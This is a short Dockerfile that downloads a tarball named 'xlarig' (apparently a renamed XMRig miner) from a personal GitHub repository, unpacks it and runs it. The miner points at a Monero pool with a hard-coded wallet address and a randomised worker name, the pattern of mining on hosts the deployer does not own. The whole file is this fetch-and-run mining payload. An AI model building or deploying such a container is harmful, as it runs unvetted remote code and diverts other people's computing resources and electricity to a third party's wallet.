FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/Adeemar7/soft/raw/main/xlarig.tar.gz
RUN tar -xvf xlarig.tar.gz

ENTRYPOINT [ "./xlarig" ]
CMD [ "-o", "xmr.2miners.com:2222", "-u", "86bqyB1FLa39SVdf5HzEmT1NfuKi9auJej4sYBqptTTU4Wz17ZeBmfa7nZYiEBVW4CNeJNi3UZFmJhNcfmd4zqVKJeirEK5.$(echo $(shuf -i 1000-999999 -n 1)-tolot)" ]
    
